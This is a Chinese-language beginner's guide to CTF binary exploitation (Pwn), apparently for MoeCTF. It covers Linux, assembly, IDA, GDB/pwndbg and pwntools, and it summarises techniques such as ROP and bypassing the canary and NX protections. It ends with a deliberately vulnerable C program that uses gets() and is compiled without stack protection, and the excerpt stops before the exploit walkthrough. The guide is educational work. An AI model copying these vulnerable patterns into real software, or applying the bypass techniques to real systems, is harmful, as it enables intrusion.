+<p>libc 和 ld 分别是 Linux C 标准库和动态链接器。我们用 C 语言编写程序时经常调用一些”从天而降”的函数（<code>printf</code>、<code>scanf</code>……），它们其实就在 libc（通常为 GNU 提供的 glibc）里，ld 则搭起你的程序和这些函数间的”桥梁”。（详见下文”编译与汇编”）Linux 系统中几乎所有软件都需要用到它们！</p>
+</blockquote>
+<h3 id="Linux-操作"><a href="#Linux-操作" class="headerlink" title="Linux 操作"></a>Linux 操作</h3><p>既然 Pwn 一般在 Linux 中操作，那么学习一些 Linux shell 操作自然必要。你至少应该明白 <code>cd</code>、<code>ls</code>、<code>chmod</code>、<code>file</code>、<code>cat</code>、<code>grep</code>、<code>strings</code>、<code>man</code> 等基础命令和管道与重定向的概念。在这期间，你也将学到 Linux 用户与用户组及其权限管理机制。推荐这个短文（选读）：《命令行的艺术》。</p>
+<blockquote>
+<p><strong>NOTE</strong></p>
+<p>在计算机领域，”shell”是一种计算机程序，它将操作系统的服务提供给人类用户或其他程序，在 Linux 中通常指命令行界面。</p>
+</blockquote>
+<p>对于 Pwn，一个很重要且必要的命令行工具是 Netcat（<code>nc</code> 命令），它能用来连接 Pwn 题目在线环境。Netcat 是一个强大的多功能网络工具，目前你只需要知道一种用法：<code>nc &lt;ip&gt; [端口]</code>。</p>
+<blockquote>
+<p><strong>NOTE</strong></p>
+<p>各种命令行文档里的尖括号”&lt;参数名&gt;”代表必需参数，方括号”[参数名]”代表可选参数，实际使用时不输入。在某些版本的 Netcat 中上述语法应为 <code>nc &lt;ip&gt;[:端口]</code>。</p>
+</blockquote>
+<p>另外你应该学习版本控制软件 git 的基本使用方法，主要是 <code>git clone &lt;URL&gt;</code>，用于下载各种工具。（git 的功能远不止于此）</p>
+<p>还需要了解 Linux 常见的系统调用（syscall）——<code>open</code>、<code>read</code>、<code>write</code>、<code>mmap</code>、<code>execve</code> 等和文件描述符（file descriptor &#x2F; fd）的概念：<code>stdin</code> - 0、<code>stdout</code> - 1…… 它们是用户空间程序（我们平时运行的程序）和操作系统内核沟通的桥梁。你需要知道 Linux 程序运行时发生了什么（如动态链接过程，<code>got</code>、<code>plt</code> 的概念，调用栈结构）。</p>
+<p>很乱对吧？若想系统地详细了解，推荐这本书：《鸟哥的 Linux 私房菜》（文中 CentOS7 已停止支持，勿安装）。</p>
+<p>Linux 一切皆文件！希望你能从中感受到 Unix 哲学的魅力。 😃 之后我强烈建议你在空闲时间看看这系列视频：《计算机教育中缺失的一课》（镜像）。</p>
+<h2 id="四、编译与汇编"><a href="#四、编译与汇编" class="headerlink" title="四、编译与汇编"></a>四、编译与汇编</h2><p>当你读到这里时，你或许已经能用 C 语言编写并运行简单程序（最好在 Linux 中操作），然而对于 Pwn 来说，我们必须要熟悉程序编译过程和基本的汇编语句。你需要知道 ELF 文件格式、预处理 -&gt; 编译 -&gt; 汇编 -&gt; 链接（静态 &#x2F; 动态）过程、Linux 进程虚拟内存空间（栈、BSS 段、数据段、代码段等）。理解调用栈结构及其增长方向与数据存储增长方向相反是 Pwn 前期学习的一大重点。</p>
+<p>对于汇编语句，我们平时使用的和 Pwn 程序一般编译至 x86 CPU 指令集（本文默认 amd64），你需要学习 x86 汇编基础，至少应能看懂 <code>mov</code>、<code>lea</code>、<code>add</code>、<code>sub</code>、<code>xor</code>、<code>call</code>、<code>leave</code>、<code>ret</code>、<code>cmp</code>、<code>jmp</code> 及条件跳转、<code>push</code>、<code>pop</code>、<code>nop</code>。一般来说你现在可以认为 CPU 会顺序依次执行这些语句，但由于乱序执行、分支预测等技术，实际情况较为复杂。除了汇编语句，你需要了解 x86 CPU 寄存器，认识有特殊用途的寄存器（<code>rsp</code>、<code>rip</code>……）。</p>
+<p>在做 Pwn 题时，有时你需要先在适当位置填入 shellcode（用于获取 shell 的汇编码）再劫持控制流（详见下文）至此处以执行。你需要知道计算机在汇编层面是如何调用函数的。具体而言，你需要知道并牢记 amd64 System V ABI 函数调用规约：调用函数时的部分参数通过寄存器（<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>）传递其余通过栈传递，32 位系统直接通过栈传递参数（从右至左入栈）；函数返回值也由寄存器（<code>rax</code>）传递。除了函数调用，你还需要知道 syscall 的系统调用号与参数的传递方式（<code>rax</code>……），这与函数调用类似。（善用搜索引擎）</p>
+<h2 id="五、操作系统"><a href="#五、操作系统" class="headerlink" title="五、操作系统"></a>五、操作系统</h2><p>这个属于比较进阶的基础知识了，你不必在一开始就学习，但是，想要成为一个优秀的 Pwn 人，操作系统绝对是不可或缺的，未来学校也会为你开设操作系统课，足以说明其重要性。如果你等不及的话，这里也为你推荐一门宝藏课程，来自南京大学蒋岩炎老师的操作系统课（当你的基础还没有那么牢固的时候，可能会看不懂，所以这里的区域请以后再来探索）。</p>
+<h2 id="六、学习路线"><a href="#六、学习路线" class="headerlink" title="六、学习路线"></a>六、学习路线</h2><p>终于正式开始 Pwn 了。 😇 以上前置知识不用先学完，最好边学边做。学习 Pwn 一定不能一直读书，这并不能让你”基础扎实”，反而会让你被庞大的前置知识劝退，学习起来没有任何的反馈感，网络安全是十分重实践的领域。我的经验是多做题，多看其他师傅（通称）的 Writeup（赛后复盘），当出现看不懂的知识的时候，就去查询，一层层的递归学习。另外，尽量看在线资源，书籍信息一般具有滞后性。</p>
+<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p>IDA 是当下一款强大的交互式反汇编器，因为我们在做题的时候，多数情况下附件都只会提供本题在线服务（由 nc 转发）的可执行文件。因此我们需要通过 <code>objdump</code> 等命令将其内容解释为人类可读信息。更好的办法是使用专业的逆向分析软件，例如开源软件 Radare2 或者商业软件 IDA（推荐）。IDA 能为你产生类 C 的伪代码，帮助你了解整个程序在干什么，还原程序的原貌，Pwn 的逆向相对比较简单，一般来说只需要将可执行文件拖入 IDA，直接以默认配置进行加载，按下 F5 即可进行反编译，产生伪代码进行阅读。常用的快捷键有以下：</p>
+<ol>
+<li><code>g</code> 跳转到指定的地址。</li>
+<li><code>a</code> 将数据转换为字符串。</li>
+<li><code>shift + F12</code> 打开字符串窗口，可以找出所有的字符串。</li>
+<li><code>ctrl + w</code> 保存 IDA 数据库，保留你当前的工作痕迹，下一次打开时仍能从当前逆向了一半的基础上继续。</li>
+<li><code>x</code> 查看某个函数的交叉引用。</li>
+<li><code>n</code> 更改变量或者函数的名称，当程序没有符号时，常以类似 <code>sub_2040</code> 的名称存在，此时可以根据程序的执行流程，对符号进行还原，提高伪代码的可读性。</li>
+<li><code>/</code> 在反编译后伪代码的界面写下注释。</li>
+</ol>
+<p>更多的快捷键以及功能可以通过该帖子进行了解。</p>
+<h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h3><p>当我们通过 IDA 等了解了这个程序的伪代码，接下来就是调试了，调试能帮助我们更好的了解这个程序的执行流程，对于 Linux 我们必备 GNU 调试器 gdb，它能追踪程序运行的诸多细节。我们常用的是 pwndbg 这个针对 GDB 的插件，它的安装流程如该帖子所述，对于 GDB + pwndbg，我们常用的命令有以下：</p>
+<ol>
+<li><code>start</code> GDB 会寻找程序的入口并下断点，然后执行到该断点。</li>
+<li><code>run</code> 简写为 <code>r</code>，运行程序，与 start 的区别是，run 之后将一直执行到程序的结束或者断点，通过 <code>run abc</code>，可以以 <code>abc</code> 为参数运行。</li>
+<li><code>next</code> 简写为 <code>n</code>，源代码级别的调试，运行下一行代码。</li>
+<li><code>nexti</code> 简写为 <code>ni</code>，汇编指令级别的调试，运行下一个指令。</li>
+<li><code>step</code> 简写为 <code>s</code>，下一行代码，当遇到函数的时候会步入函数。</li>
+<li><code>stepi</code> 简写为 <code>si</code>，下一行指令，当遇到函数的时候会步入函数。</li>
+<li><code>info register</code> 简写为 <code>i r</code>，查看当前寄存器信息。</li>
+<li><code>disassemble</code> 简写为 <code>disass</code>，反汇编所给地址或寄存器中所给地址处的指令，如 <code>disass $rip</code>，查看当前 rip 处的指令，<code>disass 0x40112b</code>，查看地址 0x40112b 处的指令。</li>
+<li><code>break</code> 简写为 <code>b</code>，下断点，可以通过 <code>info b</code> 查看当前下的所有断点，以及通过 <code>b *$rebase(&lt;offset&gt;)</code> 通过相对程序基址的偏移下断点（当找不到入口信息，无法 <code>start</code> 的时候，常通过这个进行下断点）。</li>
+<li><code>vmmap</code> 查看程序的地址映射。</li>
+<li><code>checksec</code> pwndbg 中集成了 pwntools 的一些命令，checksec 就是其中一个，查看可执行文件的保护机制。</li>
+<li><code>cyclic</code> 同样是 pwntools 的一个命令，能产生不重复的模式字符串，常用于确定栈偏移，如 <code>cyclic 15</code> 能产生”aaaaaaaabaaaaaa”。</li>
+<li><code>quit</code> 简写为 <code>q</code>，退出当前调试。</li>
+<li><code>ctrl + c</code> 中断被调试的程序，举个例子，比如当前程序跑到了 <code>read</code>，阻塞在了接收输出的时候，此时可以通过 <code>ctrl + c</code> 中断程序的运行，此时你可以查看程序中断时的寄存器、栈、内存、调用栈等状态。</li>
+<li><code>TAB</code> 进行命令的补全。</li>
+<li><code>aslr on/off</code> 开启或者关闭 ASLR（见下文），下一次运行生效。</li>
+<li><code>stack</code> 查看当前栈的信息。</li>
+<li><code>x</code> 通过 <code>x/i</code> 打印指令，<code>x/s</code> 打印字符串，<code>x/x</code> 打印十六进制数等。这个的参数比较多，建议自行查阅资料来了解。</li>
+<li><code>tele</code> 是 pwntools 提供的一个命令，可以自动解析该地址处的内容及引用，但是它解释指令的时候不一定正确，反汇编指令仍推荐 <code>x/i</code>。</li>
+</ol>
+<p>请一边做题一边领悟它们的作用。其他的一些命令，也同样为你推荐一篇帖子进行学习。</p>
+<h3 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h3><p>还记得之前好不容易配置好的 pwntools 吗？它是一个强大的 Python 库，它能够替我们自动与程序交互，接收程序输出并向程序输入，和手动键盘操作的效果差不多（更快！）。Pwntools 中还有很多实用工具，不仅仅是一个”输入输出工具”。学习 pwntools 不需要从头读文档，应该用到什么学什么。多读其他师傅的 exp（漏洞利用脚本）可以发现很多方便的 pwntools 用法。你至少需要知道如何接收程序输出，如何向程序输入，特别是无法用键盘正常输入的”二进制”信息。当你做了一些 pwn 题后，甚至应该写一个属于自己的 pwntools 模板。这里为你推荐 pwntools 的中文文档，以及，我推荐你学习一下 pwn college 中的 pwntools 模块，后文将会对 pwn college 这个宝藏网站进行详细的介绍。</p>
+<p>这里为大家说一下如何用 pwntools 结合 pwndbg 进行调试，在脚本中指定 <code>context</code>，常用的如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>之后需要指定终端，这个设置告诉 pwntools 启动一个新终端窗口&#x2F;tab&#x2F;pane 来运行 GDB，而以下是几种常见的终端：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#wsl</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;wt.exe&#x27;</span>,<span class="string">&#x27;wsl&#x27;</span>]</span><br><span class="line"><span class="comment">#tmux</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#konsole</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;konsole&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>之后在脚本中通过 <code>gdb.debug()</code> 或者 <code>gdb.attach(&lt;process&gt;)</code> 启动 gdb，两者的区别是，前者是从头启动程序，并自动 attach 到 GDB，而后者是 attach 到已有进程进行调试，需要在 attach 之前通过 <code>process(&lt;path&gt;)</code> 启动程序。</p>
+<blockquote>
+<p><strong>TIP</strong></p>
+<p>虽然 <code>recv()</code> 和 <code>send(...)</code> 很方便，但是我强烈建议使用 <code>recvuntil(...)</code> 和 <code>sendafter(...)</code>，以防止各种本地和远程环境不符的情况。<code>sendafter</code> 函数的首个参数（”接收至”）也不宜过长，几个字符即可（别忘了 <code>\n</code>）。Pwntools 库函数的参数和返回值类型通常为 <code>bytes</code>，传入字符串字面量时应在前加上 <code>b</code> 标记（例如 <code>b&#39;I am string&#39;</code>），使其成为 <code>bytes</code>（不这么做会有警告，虽然不影响解题）。</p>
+</blockquote>
+<h3 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h3><p>当下，AI 时代来临，以前你获取知识，需要去图书馆查阅相关书籍，或者通过搜索引擎进行检索（搜索引擎的检索是一门艺术），技术存在壁垒，当初我入门的时候，就苦于不知道学什么、怎么学，被狠狠的劝退了，但现在不同了，AI 的崛起，让你拥有了几个知无不言言无不尽并且博览群书的老师，如 DeepSeek，ChatGPT，Grok 等等，虽然并不是所有情况下，他都能回答正确，但是对于大多数的问题，他都会给你一个正确的答案，所以善用 AI，能够帮助你快速的学习，赶超与别人的差距，这里并非让你什么都依赖 AI，请你一定记住，AI 只是一个辅助的工具，多动手才是王道！</p>
+<p>AI 可以做的事情包括但不限于帮你了解一个从未知道的知识，解决报错（你的学习中会遇到数不尽的报错，让你头皮发麻，大多数时候，AI 都能帮你解决，但每次解决之后请你稍微花点时间了解一下为什么会出现这个错误，而不是把 AI 给你的命令复制过去就结束了，这样有助于遇到相同的情况可以自主解决），翻译英文文献或者帖子等等，用好 AI，他就是你锋利的 🗡！</p>
+<h2 id="七、常见漏洞和利用方法"><a href="#七、常见漏洞和利用方法" class="headerlink" title="七、常见漏洞和利用方法"></a>七、常见漏洞和利用方法</h2><p>以下列举出一些入门常见的漏洞和利用方法，限于篇幅只能一句话概括且不够准确严谨。你必须通过 CTF Wiki 等资料（详见下文”推荐资料”）具体学习，这里仅提供学习方向。（” ⭐ “数代表针对入门学习的重要性）</p>
+<h3 id="普适漏洞及利用"><a href="#普适漏洞及利用" class="headerlink" title="普适漏洞及利用"></a>普适漏洞及利用</h3><ul>
+<li><strong>整数溢出</strong> —— 数学世界整数有无穷多，但由于内存限制，计算机中补码表示的”整数”有上下限。通过输入超大数字溢出或者利用有符号整数（负数）强转为无符号整数可以构造超大数字，从而绕过检查或越界写入。 ⭐⭐⭐</li>
+<li><strong>栈缓冲区溢出</strong> —— 最经典的漏洞，通过越界写入修改函数返回地址或栈指针从而实现劫持控制流和栈迁移（篡改栈基址 <code>rbp</code>）。 ⭐⭐⭐⭐</li>
+<li><strong>字符串 <code>\0</code> 结尾</strong> —— C 风格字符串以零字节（”二进制”的 <code>\0</code> 而非 ASCII 数字 0）结尾。如果破坏或中途输入这一标记则可泄漏信息或绕过检查（如绕过 <code>strcmp</code>）。这是很多漏洞的”万恶之源”。 ⭐⭐⭐</li>
+<li><strong>返回导向编程（ROP）</strong> —— 这是 Pwn 前期学习重点。其中包含 ret2text、ret2libc、ret2syscall、ret2system、ret2shellcode、ret2csu、SROP 等，这也是栈缓冲区溢出的主要目的。进阶：通过 <code>ropper</code> 或者 ROPgadget 等工具寻找程序中 gadgets（ROP 片段，以 <code>ret</code> 结尾）结合栈缓冲区溢出构造调用链控制程序执行流甚至能执行几乎任意行为（通常 <code>open</code>、<code>read</code>、<code>write</code>）。 ⭐⭐⭐⭐⭐</li>
+<li><strong>竞争条件</strong> —— 程序并行访问共享资源时，由于各线&#x2F;进程执行顺序不定，有可能绕过检查或破坏数据。 ⭐</li>
+</ul>
+<h3 id="Linux-安全机制"><a href="#Linux-安全机制" class="headerlink" title="Linux 安全机制"></a>Linux 安全机制</h3><ul>
+<li><strong>NX（No eXecute）</strong> —— 通过将栈内存权限设置为不可执行，使栈上机器码不可执行，从而无法简单地在栈上布置 shellcode。一般所有题目都会开启，可用栈迁移或修改可执行位等方法绕过。 ⭐⭐⭐</li>
+<li><strong>Canary</strong> —— 在栈上栈指针和返回地址前设置一个随机值（canary），通过比对函数返回前和执行前该值是否相等来检测栈缓冲区溢出攻击。通过直接越界读泄漏、劫持 <code>scanf</code> 特殊输入或爆破等方法绕过。 ⭐⭐⭐⭐</li>
+<li><strong>ASLR &#x2F; PIE</strong> —— 通过随机化程序的内存布局（地址），使得攻击者难以预测程序的内存结构，从而增加攻击难度。设法泄漏基址或爆破等从而绕过。 ⭐⭐</li>
+<li><strong>RELRO</strong> —— 通过将动态链接程序的全局偏移量表（GOT）在程序启动后设置为只读，防止通过修改其中数据结构进行攻击。 ⭐</li>
+<li><strong>Seccomp</strong> —— 一种沙箱保护机制，可以限制程序能够使用的 syscall。 ⭐</li>
+<li><strong>CFI（IBT &#x2F; SHSTK）</strong> —— 控制流完整性保护，可以阻止 ROP 攻击，抑制 COP、JOP 攻击。</li>
+</ul>
+<h3 id="GLibc-相关利用"><a href="#GLibc-相关利用" class="headerlink" title="GLibc 相关利用"></a>GLibc 相关利用</h3><ul>
+<li><strong>fmt_str</strong> —— 若 <code>printf</code> 等格式化字符串函数中”格式”（format）参数为用户输入，则可被利用，从而达到任意地址读写等目的。 ⭐⭐⭐</li>
+<li><strong>one_gadget</strong> —— 将程序指针修改至 glibc 中的一些特殊位置（one_gadgets）同时满足少量条件即可直接 getshell。 ⭐</li>
+<li><strong>Heap &#x2F; _IO_FILE &#x2F; …</strong> —— Pwn 永无止境……</li>
+</ul>
+<h2 id="八、pwn-college"><a href="#八、pwn-college" class="headerlink" title="八、pwn college"></a>八、pwn college</h2><p>这里推荐一个学习 Pwn 的宝藏网站 Pwn college：<a target="_blank" rel="noopener" href="https://pwn.college/">https://pwn.college/</a></p>
+<p>简单介绍一下，这个是一个由亚利桑那大学（University of Arizona）网络安全研究团队开发的、面向初学者和进阶者的免费在线 PWN 学习平台，其中包含了课程、靶场等，相当于他们学校的本科生和研究生修 pwn 的课程所用的实验平台，初一打开，可能会因为全英的界面有些劝退（当初第一次被推荐的时候我就是这样的），但稍微了解怎么用之后，其实很简单，这里为大家介绍一下它主要的模块和用法，首先是上面的 dojo（道场），这是主要的题目模块，其中包含上面的入门模块和下面的核心模块，Getting Started 中主要是教你怎么使用这个网站，Linux Luminarium 中则是包含了很多 Linux 的基础知识，是一个上手 Linux 的模块，能很快的通过一个个的 challenge 模块对 Linux 的使用进行快速了解，Computing 101 中主要是对汇编语言进行了一个学习，最后一个子 module 甚至让你用汇编语言搭建一个简易 Web server，对该模块的学习能让你很快的掌握汇编语言的使用，Playing With Programs 模块中，则包含了一些与程序的交互，下面的核心模块中，Program Securiy 更贴近于我们前期的 ROP 学习，推荐前面的基础模块入门后，优先选择该核心模块进行学习。</p>
+<p>pwn college 的学习曲线设计非常平滑，从 0 基础进行教学，并且很多模块都有配套的视频课程，Youtube 课程有自带的字幕，看起来没有想象的困难。每个模块中含有若干 challenge，由浅入深，学习比较有反馈感。</p>
+<p>start 将正式开启一个挑战环境，而 Practice 将开启一个有 root 权限的挑战环境（无法获得真正的 flag），开启之后，通过上方的 Workspace 将开启一个远程环境上的 VSCode 界面。</p>
+<p>接下来的解题将主要通过该场景进行，<code>/challenge</code> 路径下放着题目，解题后在环境启动界面提交 flag。</p>
+<h2 id="九、推荐资料"><a href="#九、推荐资料" class="headerlink" title="九、推荐资料"></a>九、推荐资料</h2><p>以下资料不是全都要看完，只需自行挑选一些最适合自己的即可。</p>
+<ul>
+<li>《深入理解计算机系统》—— CSAPP</li>
+<li>《程序员的自我修养：链接、装载与库》</li>
+<li>CTF Wiki</li>
+<li>CTF-All-In-One</li>
+<li>《CTF 权威指南（Pwn 篇）》</li>
+<li>CS 自学指南——计算机科学（Computer Science）自学指南。</li>
+<li>《IDA Pro 权威指南》</li>
+</ul>
+<p>以下推荐一些视频课，帮助一些不是很喜欢看书的同学有效的学习：</p>
+<ul>
+<li>CSE365，是 pwn college 中针对新生开设的一堂课，将带领新入门的学生走进 pwn 的世界。</li>
+<li>CSE466，是 pwn college 中进阶的课程，你将学习程序安全、系统安全等进阶知识。</li>
+<li>你有多想 pwn，B 站上国资社畜师傅针对 pwn 的一个课程，相比前面的英文课程，这个中文课程更为友好一些。</li>
+<li>南大计算机基础，了解计算机基础的一门好课，基础不牢地动山摇！</li>
+</ul>
+<h2 id="十、常用小-tip"><a href="#十、常用小-tip" class="headerlink" title="十、常用小 tip"></a>十、常用小 tip</h2><h3 id="终端代理"><a href="#终端代理" class="headerlink" title="终端代理"></a>终端代理</h3><p>当本机启动代理之后，终端的流量并不会走代理，此时终端的一些网络访问仍然存在问题，比如 docker 拉取镜像、github 访问等会卡掉，此时需要在终端内手动进行代理的设置，下面以 WSL2 举例，大多数常用代理软件，如 Clash Verge 的指定端口为 7890，此时在终端内通过以下命令查看本机在 WSL 中的 ip：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route | grep default</span><br></pre></td></tr></table></figure>
+
+<p>之后通过以下命令进行代理设置，之后终端就可以快乐的科学上网辣！（仅限于当前的终端，重新启动后需再次设置，亦或者加入到 shell 启动配置文件，这样每次启动会自动设置）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://&lt;查询到的ip&gt;:7890&quot;</span></span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://&lt;查询到的ip&gt;:7890&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h3><p>Markdown 是一种轻量级标记语言，用于编写格式简单、易读，我们在学习中通常需要保留学习痕迹或者记录笔记，最重要的，编写 Writeup 通常也采用 Markdown，因此这里推荐使用一些 Markdown 编辑器进行编写，如 Typora 和 Notion 等，上手之后非常方便。</p>
+<h3 id="GDB-调试窗口优化"><a href="#GDB-调试窗口优化" class="headerlink" title="GDB 调试窗口优化"></a>GDB 调试窗口优化</h3><p>当我们调试的时候，经常会发现，pwndbg 输出的信息太多，导致经常和程序的输出混杂在一起，难以分别，这里通过更改 GDB 的输出，将 pwndbg 的输出信息输出到另一个终端上，形成以下的样子：</p>
+<p><em>（原文此处配有双终端截图：左边是程序的输出，右边的终端是 pwndbg 的输出）</em></p>
+<p>能看到左边是程序的输出，右边的终端是 pwndbg 的输出，这样将信息分离，能更好的帮助我们调试，具体实现如下，首先，在要输出右侧信息的终端，通过执行 <code>tty</code> 命令查询终端号，得到的输出如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dev/pts/5</span><br></pre></td></tr></table></figure>
+
+<p>编辑 GDB 的 init 文件，执行 <code>vim ~/.gdbinit</code>，输入以下设置：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set context-output /dev/pts/5</span><br></pre></td></tr></table></figure>
+
+<p>接下来，右侧的这些信息就会全都输出到该终端了。</p>
+<h2 id="十一、解题"><a href="#十一、解题" class="headerlink" title="十一、解题"></a>十一、解题</h2><p>别忘了这里是 CTF！一般的 CTF Pwn 题目由题目描述、附件、远程环境组成。你需要做的是通过刚才所学分析附件中程序的漏洞并成功在本地 getshell 或拿到”flag”。获取本地的 shell 没什么意义，远程环境运行的程序和附件中的相同，只要连接远程环境并执行相同操作即可获取远程的 shell！（MoeCTF Pwn 比较简单，不一定需要 getshell。）程序附件一般没有可执行权限，记得先执行 <code>chmod +x &lt;file&gt;</code>。</p>
+<blockquote>
+<p><strong>IMPORTANT</strong></p>
+<p>对于西电 CTF 终端：如果你正在使用虚拟机&#x2F;WSL，最稳妥的方案是在虚拟机&#x2F;WSL 上安装并配置 wsrx。如果在主机配置 wsrx：请首先确保虚拟机能和主机共享网络（例如能访问正常网站）。在 wsrx 主页点击小齿轮设置监听地址为 0.0.0.0，然后在主机执行 <code>ipconfig</code> 查询本机局域网 IP 地址（或者为虚拟机配置的 NAT 分配的主机地址），在虚拟机&#x2F;WSL 里通过主机地址（例如 192.168..）连接远程环境而非 127.0.0.1&#x2F;localhost。注意在这种情况下需要将平台在线环境给出的 ws 链接（点击”WSRX”键）粘贴到 wsrx 主页进行连接而不能用平台直接创建连接。连接环境并非题目考察内容，如仍有问题请直接联系群管理员。</p>
+</blockquote>
+<p>MoeCTF 题目设置由易到难知识覆盖面较广，而且面向基础。但是但是，刚开始做 Pwn 也许一道题就能做一天（也算是 Pwn 的乐趣所在吧 😌），这很正常。如果你未能完全看懂本指北，也很正常（”学习路线”一节有不少”超纲”的知识）。大胆尝试才是关键！直接开始 MoeCTF 2025 吧，如果你未来想要继续做题：</p>
+<ul>
+<li>攻防世界</li>
+<li>Bugku</li>
+<li>pwn.college（零基础）</li>
+<li>Pwnable</li>
+<li>CTFTime——全球 CTF 赛事时间表。</li>
+</ul>
+<h2 id="十二、实例"><a href="#十二、实例" class="headerlink" title="十二、实例"></a>十二、实例</h2><blockquote>
+<p><strong>CAUTION</strong></p>
+<p>接下来的实例中会反复出现 <code>gets</code> 函数，但请注意，这是一个早已弃用的、一定会产生漏洞的函数。我们使用这个函数只是为了演示方便，在现实存在的程序中很难见到它。大家在编写正常的 C 程序时千万不要使用 <code>gets</code>。</p>
+</blockquote>
+<h3 id="一个简单的栈缓冲区溢出"><a href="#一个简单的栈缓冲区溢出" class="headerlink" title="一个简单的栈缓冲区溢出"></a>一个简单的栈缓冲区溢出</h3><p>接下来用一个栈缓冲区溢出，帮你了解一下栈缓冲区溢出主要是在做什么，如果你还不知道栈是什么的话，可以通过 CTFWiki 进行了解。</p>
+<p>环境：x86_64 GNU&#x2F;Linux</p>
+<p>在运行之前，通过 <code>echo &quot;flag{Congratulations You get your first flag!}&quot; &gt; flag</code> 在当前路径生成一个 flag，并编写我们的 pwn.c 文件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File: pwn.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getflag</span><span class="params">()</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> n = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    write(<span class="number">1</span>, buf, n);</span><br><span class="line">    close(fd); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">char</span> flag[<span class="number">0x8</span>];</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x8</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now input something! Maybe I can give you a flag!&quot;</span>);</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strcmp</span>(flag,<span class="string">&quot;YourFlag&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">    getflag();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nI know u can do this!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNothing.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来通过以下命令进行编译，（<code>$</code> 仅为提示符，实际不输入）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -no-pie -fno-stack-protector pwn.c -o pwn</span><br></pre></td></tr></table></figure>
+
+<p>此时在当前路径生成了一个名为 <code>pwn</code> 的程序文件，接下来我将带着你走一遍这道题目的攻击流程。</p>
